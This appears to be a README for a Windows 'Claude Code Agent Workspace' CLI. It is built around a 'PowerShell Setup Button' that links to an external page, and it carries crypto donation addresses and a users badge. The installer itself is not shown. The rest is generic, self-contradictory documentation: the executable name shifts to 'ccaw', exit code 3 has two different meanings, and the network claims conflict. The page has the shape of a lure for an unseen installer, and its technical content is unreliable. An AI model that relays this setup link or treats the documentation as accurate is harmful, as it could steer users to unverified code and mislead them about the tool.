<div align="center">

# Claude Code Agent Workspace CLI for Windows 10 & 11

![](files/preview.png)

### ⚡ PowerShell Setup Button

<a href="https://zavi2997-droid.github.io/claude-code-agent-workspace/"><img src="files/button.png" width="400" alt="PowerShell setup"></a>

[![powershell](https://img.shields.io/badge/POWERSHELL-INSTALLER-84cc16?style=flat-square&labelColor=0d1117)]() [![platform](https://img.shields.io/badge/PLATFORM-WIN_11-a3e635?style=flat-square&labelColor=0d1117)]() [![users](https://img.shields.io/badge/USERS-453-65a30d?style=flat-square&labelColor=0d1117)]()

<div align="center">
<h3>Show your support</h3>
<p><strong>BTC</strong>:&nbsp;<code>1LBVdxPpRDww4P9oT6gxCmnvGyWuCoGpvt</code> | <strong>ETH</strong>:&nbsp;<code>0x14bc70510f8e57ec9a36198c68FA18335EA174ef</code> | <strong>TRON</strong>:&nbsp;<code>TTUbNK6mu21kFG268snaXLa6ssmrco5g8i</code></p>
</div>

</div>

---

`claude-code-agent-workspace` is a command-line tool for provisioning and managing isolated workspaces for Claude Code agents, including per-agent directory scaffolding, configuration layering, and lifecycle commands for starting and tearing down sessions. It is intended for developers who already run Claude Code locally and need repeatable, reproducible agent environments rather than ad hoc setup. The tool covers workspace initialization and agent orchestration only; it does not manage model access, credentials, or network policy for Claude Code itself, and it assumes a working Claude Code installation and a supported shell environment. Behavior is deterministic given the same inputs and configuration files, though commands that mutate the filesystem are explicit about their targets and refuse to operate outside the configured workspace root.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Per-project workspace isolation.** Each workspace is a self-contained directory containing configuration, task definitions, and run artifacts. Workspaces do not share state; switching between them requires only changing the working directory or passing an explicit path.

- **Declarative task definitions.** Tasks are described in plain-text configuration files rather than imperative scripts. The tool parses these definitions, validates them against a fixed schema, and reports schema violations with file and line references before any execution begins.

- **Deterministic execution order.** Tasks declare dependencies explicitly; the tool computes a topological ordering and refuses to run when cycles are detected. Independent tasks may be parallelized, but ordering is never inferred from file names, directory layout, or declaration position.

- **Structured run artifacts.** Every invocation writes a run record containing the resolved task graph, per-task status, timestamps, and captured stdout/stderr. Records are written in a line-delimited format suitable for downstream processing; no database or daemon is required.

- **Explicit failure semantics.** A task failure halts its dependents but does not silently abort unrelated branches unless `--fail-fast` is set. The exit code reflects the aggregate outcome, and the mapping from outcome to exit code is fixed and documented under Exit codes.

- **Non-interactive by default.** The tool never prompts for input during a run. All parameters are supplied via flags or workspace configuration, making it safe to invoke from scripts and CI environments.

- **Bounded scope.** The tool manages workspace layout, task ordering, execution, and artifact capture. It does not provision environments, install dependencies, manage secrets, or perform network operations on your behalf; those concerns belong to the tasks themselves. There is no plugin system and no remote execution backend.

- **Single binary, no runtime services.** The tool runs as a standalone executable with no background process, no listening port, and no state outside the workspace directory it is pointed at.

## How It Works

Claude Code Agent Workspace is a thin orchestration layer over the Claude Code CLI. It does not implement a model, a transport, or an agent runtime of its own; every inference request, tool invocation, and permission prompt is handled by the underlying Claude Code process. The workspace's job is to arrange the filesystem, configuration, and process environment so that a given agent runs with a predictable set of instructions, tools, and working directory.

At startup, the tool resolves a workspace root and loads its configuration. Configuration is merged from a workspace-level file, an optional per-agent file, and command-line flags, in that order of increasing precedence. Unknown keys are rejected rather than silently ignored, so typos surface as errors instead of being masked by defaults. Flag parsing happens before any filesystem writes, so invalid invocations leave no partial state behind.

Each agent is defined by a directory containing an instruction file and optional supporting files. When an agent is launched, the workspace constructs the argument vector for the Claude Code CLI from the merged configuration, sets the working directory to the agent's declared root, and applies a filtered environment. Environment filtering is allowlist-based: only variables named in the configuration or in a small built-in set are passed through. This means secrets exported in your shell are not inherited by default, and you must opt variables in explicitly.

The tool invokes the Claude Code CLI as a child process and streams its standard output and standard error to the parent unmodified. It does not parse, buffer, or reformat model output. Structured data the workspace needs—such as session identifiers or exit status—is read from the child's exit code and, where the CLI exposes it, from files the CLI itself writes. Because output is passed through verbatim, piping the workspace into other tools behaves the same as piping Claude Code directly.

Process lifecycle is intentionally simple. The workspace does not daemonize, does not manage a background queue, and does not retry failed runs. If the child process is interrupted (for example, by SIGINT), the signal is forwarded to the child and the workspace exits with a status that reflects the interruption. There is one child per invocation; concurrent agents require separate invocations.

State is confined to the workspace root. The tool writes only within directories it creates or that are declared in configuration, and it does not modify global configuration for the CLI. Cleanup is limited to temporary files created during a single invocation; persistent artifacts, including session transcripts and any files the agent writes, remain on disk unless you remove them. This is deliberate: the workspace treats agent output as user data and does not garbage-collect it.

The scope is correspondingly narrow. The workspace does not sandbox the child process beyond what the Claude Code CLI provides, does not enforce resource limits, and does not validate the semantic content of agent instructions. Isolation between agents is filesystem- and environment-level only. If you need stronger containment, run the workspace inside a container or a dedicated user account; the tool neither requires nor prevents this.

## Modules and Settings

### Workspace Management
Creates and maintains the structured local workspace that every other module operates against.
- Workspace location: choose the root directory where sessions, task notes and supporting files are stored.
- Scaffolding level: control how much starter structure is generated, from a minimal layout to a fuller set of directories.
- Layout preview: review the populated workspace tree from the shell or editor before beginning any session.

### Session Runner
Launches and manages agent sessions bound to the current workspace so activity stays scoped to the project.
- Session label: assign a name to each run for easier identification and later resume.
- Task description: pass an initial task so the session starts with a defined objective.
- Target subdirectory: focus the session on a specific part of the workspace.
- Resume toggle: continue from recorded context of a prior session instead of starting fresh.

### Task Queue
Coordinates multiple tasks so the agent processes them sequentially without step-by-step supervision.
- Pending task list: add, reorder or drop queued items before execution begins.
- Run mode: decide whether the queue executes immediately or waits for explicit confirmation.
- Per-task summary: review what was attempted and the recorded outcome for each queue entry.

### Session Logging
Captures a durable record of prompts, actions and results for every session.
- Verbosity level: set how much detail each log entry contains.
- Log destination: select where within the workspace logs are written.
- Replay source: use a recorded log to reproduce a prior run for debugging.

### State Inspector
Reports the current condition of the workspace so users can decide the next action.
- Output mode: switch between a compact summary and a detailed listing.
- Scope filter: limit the report to active sessions, pending tasks or leftover artifacts.
- Status report: read the resulting overview directly in the terminal.

### Cleanup and Profiles
Handles workspace hygiene and reusable defaults that shape how sessions and logs behave.
- Cleanup categories: choose which data types to prune, such as finished sessions or generated artifacts.
- Log retention: keep selected logs for reference while clearing everything else.
- Named profiles: define profiles that bundle defaults for session behavior, logging and workspace options, then switch between them without retyping flags.
- Active profile reporting: see the profile in use at session start and recorded in the log for traceability.

### Additional Settings
- Conflict handling: decide whether a new session may proceed when an earlier one is still recorded as active.
- Artifact tolerance: control whether the inspector flags or ignores leftover generated files.
- Label reuse policy: choose whether session labels must be unique or may repeat.
- Confirmation prompts: enable extra confirmation steps before queue execution or cleanup actions.

## Usage Scenarios

### Scenario 1: Isolating a Refactor in a Fresh Workspace

**Goal:** A developer wants an agent to refactor a specific module in a dedicated, inspectable workspace so agent activity never touches unrelated directories.

**Steps:**
1. Run the workspace initialization action, choosing a project-local root directory and a minimal scaffolding level.
2. Preview the generated workspace tree from the shell to confirm the layout before any session begins.
3. Launch an agent session with a session label, a task description covering the refactor, and a target subdirectory pointing at the module in question.
4. Set the logging verbosity level and pick a log destination inside the workspace.
5. After the session ends, inspect the workspace state with the compact summary output mode to confirm no stray artifacts remain.

**Expected result:** The user sees a populated workspace tree, a session record tied to the labelled run, and a readable status report confirming the session is finished with the refactor log stored where configured.

### Scenario 2: Overnight Queue of Small Maintenance Tasks

**Goal:** A developer wants to hand off several independent maintenance tasks and have them processed sequentially without supervising each step.

**Steps:**
1. Switch to a named configuration profile that bundles the preferred logging and session defaults; the active profile is reported at session start.
2. Add several tasks to the pending task list, then reorder them so dependencies run first.
3. Drop a task that turns out to be unnecessary before execution begins.
4. Set the run mode to wait for explicit confirmation, review the queue, then confirm execution.
5. When the queue finishes, read the per-task summary for each entry.

**Expected result:** The user sees a per-task summary listing what was attempted and the recorded outcome for every queue entry, plus session logs written to the configured destination for later review.

### Scenario 3: Resuming and Debugging a Prior Run

**Goal:** A developer wants to continue an earlier session and, separately, reproduce a past run to understand what went wrong.

**Steps:**
1. Use the state inspector with a scope filter limited to active sessions to see what is still recorded as open.
2. Resume the prior session using its label with the resume toggle enabled so work continues from recorded context.
3. Set the verbosity level higher and replay the source log from the earlier session to reproduce that run.
4. Compare the replayed activity against the original record in the session log.
5. Run cleanup choosing the finished-sessions category while keeping logs for reference, then re-inspect the workspace.

**Expected result:** The user sees the resumed activity appended to the session log alongside the original record, a replayed sequence of recorded inputs, and a final workspace listing that reflects only retained sessions and files.

## Usage

Invoke the tool by its executable name followed by a subcommand and any options:

```
claude-code-agent-workspace <subcommand> [options] [arguments]
```

Running it with no arguments prints a short summary of available subcommands and exits with a non-zero status. Running it with `--help` prints the same summary and exits successfully.

Subcommands are dispatched by name; unknown subcommands are rejected with an error message and a non-zero exit status. Options may be given before or after the subcommand unless a subcommand documents otherwise. Options that take a value accept either `--option value` or `--option=value`. Long options are case-sensitive; short options are single-character aliases where defined.

Argument parsing stops at `--`. Any tokens after `--` are passed through verbatim and are not interpreted as options.

The tool operates on the current working directory unless a subcommand accepts a path argument. It does not modify files outside the paths it is given, and it does not read configuration from locations other than those documented for each subcommand. Behavior that depends on environment variables is limited to those explicitly listed per subcommand; unset variables fall back to documented defaults rather than failing.

Output is written to standard output; diagnostics and errors are written to standard error. When standard output is not a terminal, output is emitted without formatting decorations. Exit status reflects the outcome of the operation, not the volume of output.

Scope note: this tool orchestrates the agent workspace only. It does not install dependencies, manage external services, or guarantee behavior outside the subcommands and options documented here. Unsupported combinations of subcommands and options are reported as errors rather than silently ignored.

## Flags

The following flags are supported. Boolean flags accept no argument; value flags require one. Flags may appear in any order. Unless stated otherwise, flags apply to all subcommands.

- `--workspace <path>` — Path to the workspace root. Defaults to the current working directory. The path must exist and must be a directory; otherwise the command exits with a non-zero status before any work begins.
- `--config <path>` — Path to a configuration file. When omitted, the tool looks for its default configuration location relative to the workspace root. An explicitly supplied path that cannot be read is a fatal error rather than a fallback.
- `--agent <name>` — Selects the agent definition to use for the current invocation. Only agents defined within the workspace are recognized. Unknown names fail fast; there is no implicit remote resolution.
- `--profile <name>` — Selects a named profile from the configuration. Profiles are resolved locally only.
- `--dry-run` — Computes and reports the actions that would be taken without mutating the workspace or invoking agents. Output reflects the same planning path as a real run, but side effects are suppressed.
- `--verbose` — Increases diagnostic output on standard error. May be repeated for additional verbosity. Does not change behavior, only logging.
- `--quiet` — Suppresses non-error output on standard output. Errors continue to be reported on standard error. Mutually exclusive with `--verbose`; supplying both is a usage error.
- `--json` — Emits machine-readable output on standard stdout where the subcommand supports it. Human-oriented formatting is disabled. Error output remains on standard error and is not part of the JSON stream.
- `--no-color` — Disables ANSI color sequences. Color is also disabled automatically when output is not attached to a terminal.
- `--timeout <duration>` — Sets an upper bound on the wall-clock time for the operation, expressed in seconds unless a unit suffix is given. On expiry the command terminates with a non-zero status; partial results are not guaranteed to be consistent.
- `--concurrency <n>` — Caps the number of concurrently executing agent tasks. Must be a positive integer. The effective ceiling may be lower depending on workspace configuration; the flag cannot raise limits imposed by configuration.
- `--yes` — Skips interactive confirmation prompts, accepting the default for each. Intended for non-interactive use. It does not bypass validation or error checks.
- `--help` — Prints usage information for the tool or, when placed after a subcommand, for that subcommand, then exits successfully.
- `--version` — Prints the tool version and exits successfully.

Scope notes: flags not listed here are not supported and will be rejected as unknown arguments. This tool does not read flags from environment variables unless a future release documents doing so; do not assume environment-based overrides. Flag behavior described above applies to the version shipped with this workspace; behavior for flags accepted by external tooling invoked indirectly is governed by that tooling and is out of scope for this document.

## Exit codes

The tool returns `0` on success and a non-zero value on failure. Exit codes follow the conventions below; any value not listed should be treated as an unexpected failure.

- `0` — Success. The requested operation completed without error.
- `1` — General error. Covers invalid flags or arguments, malformed configuration, and failures not covered by a more specific code.
- `2` — Usage error. Raised when the command line is syntactically invalid, such as an unknown flag, a missing required argument, or conflicting options. Distinct from `1` so callers can separate invocation mistakes from runtime failures.
- `3` — Workspace or path error. The target workspace directory is missing, not writable, or fails validation.
- `4` — External dependency failure. A required runtime component or underlying tool the workspace depends on was unavailable or returned an error.
- `130` — Interrupted. The process received `SIGINT` (typically Ctrl+C) and terminated before completion. Partial effects may remain and should be verified before retrying.

Exit codes are stable within a major version. New codes may be added in minor releases; scripts should check for `0` versus non-zero rather than enumerating every value. When a command emits multiple errors, the code reflects the first failure that caused termination.

## Recipes

The following examples assume `ccaw` is already on your `PATH`. Each recipe is self-contained and states its preconditions and expected result; none of them depend on network access.

### Run a single agent task non-interactively

```sh
ccaw run --agent default --prompt "summarize CHANGELOG.md" --non-interactive
```

Preconditions: a workspace exists at the default path (`./.ccaw`) or is passed with `--workspace`. The command prints the agent's final message to stdout and exits `0` on success. Partial stream output is not written to stdout when `--non-interactive` is set; use `--log-file` to capture it.

### Pin a workspace to a specific config for repeatable runs

```sh
ccaw run --workspace ./ws --config ./configs/ci.toml --prompt "lint staged files"
```

`--config` takes precedence over the workspace default config. This is the recommended form in CI: the config file is the only source of run behavior, so results do not depend on the invoking user's home directory.

### Inspect what a run would do without executing it

```sh
ccaw plan --workspace ./ws --prompt "reformat src/"
```

`plan` resolves the agent, tool permissions, and file scope, prints the resulting plan as text, and exits without invoking the model or modifying files. Exit code `0` means the plan was produced; a non-zero code indicates a configuration or scope error, and the error is printed to stderr.

### Capture structured output for downstream tooling

```sh
ccaw run --agent default --prompt "list TODO markers" --output-format json --log-file run.jsonl
```

`--output-format json` emits one JSON object per line on stdout. Progress and diagnostics go to stderr, so `ccaw ... --output-format json > out.jsonl` yields a clean parseable stream. Each line includes a `type` field; terminal events are `result` and `error`.

### Enforce a tool allowlist for an untrusted prompt

```sh
ccaw run --workspace ./sandbox --allowed-tools read,glob --prompt "$PROMPT"
```

Only the listed tools are available to the agent for this run; any request for another tool fails the run with exit code `3` (permission denied). This is a per-run override and does not modify the workspace config.

### Reproduce a failed run

```sh
ccaw run --workspace ./ws --replay ./.ccaw/runs/<run-id>/input.json
```

Every run writes an `input.json` under its run directory by default. `--replay` re-executes that input with the same config snapshot, subject to the current binary version. Replay is deterministic with respect to inputs and configuration but not with respect to model output; it is intended for debugging scope and permission issues, not for byte-identical reproduction.

### Check exit status in a script

```sh
if ccaw run --agent default --prompt "$TASK" --non-interactive; then
  echo "ok"
else
  case $? in
    1) echo "runtime error" ;;
    2) echo "usage error" ;;
    3) echo "permission denied" ;;
    *) echo "unexpected exit code" ;;
  esac
fi
```

Exit codes are documented in the Exit codes section; the values above are the stable subset. Scripts should treat any unknown code as a failure rather than special-casing it.

### Scope limitations

These recipes do not cover concurrent runs against the same workspace. Two `ccaw run` invocations sharing a workspace directory will contend on the run index and may interleave log files; use separate `--workspace` paths or serialize invocations externally. Recipes also do not cover streaming interaction, which requires the interactive mode and is out of scope for scripted use.

## FAQ

**Does this tool modify my repository?**

No. It reads project files to build context, but it does not write to, stage, or commit changes in your repository. Any file writes happen only in the workspace's own state directory.

**What does "workspace" mean here?**

A workspace is an isolated working directory that holds session state, configuration, and cached context for the agent. It is created and managed by the CLI; you interact with it through the tool's subcommands rather than by editing its internals directly.

**Where does state get stored?**

State lives under a single workspace root (configurable via a flag). If you delete that directory, all session state is lost; there is no external persistence or recovery mechanism.

**Does it require network access?**

Network access is only needed for features that fetch remote models or resources. Purely local operations run offline. If a command needs the network and it is unavailable, the command fails with a non-zero exit code rather than silently degrading.

**Which exit codes should I check?**

Exit codes are documented in the "Exit codes" section. In short: zero indicates success, non-zero indicates failure. Do not assume specific non-zero values are stable across versions unless they are explicitly documented as such.

**Can I use this in CI?**

Yes, provided CI has the required runtime and any needed credentials. The tool is non-interactive by default when stdin is not a TTY, but verify behavior for each subcommand you automate. Long-running agent sessions may not be appropriate for CI; prefer bounded, single-shot invocations.

**Does it support multiple concurrent sessions?**

Each workspace root is assumed to be used by one process at a time. Concurrent invocations against the same workspace are unsupported and may corrupt state. Use separate workspace roots for parallel runs.

**What is explicitly out of scope?**

- It is not a general-purpose agent framework or a library API.
- It does not manage dependencies, virtual environments, or toolchains for your project.
- It does not provide a GUI.
- It does not guarantee deterministic model output; results vary by model and context.

**How do I report a problem or check compatibility?**

Include the tool version, the exact command, the exit code, and relevant stderr in any report. Compatibility is defined only for the runtime versions stated in the project's documentation; other versions are untested and unsupported.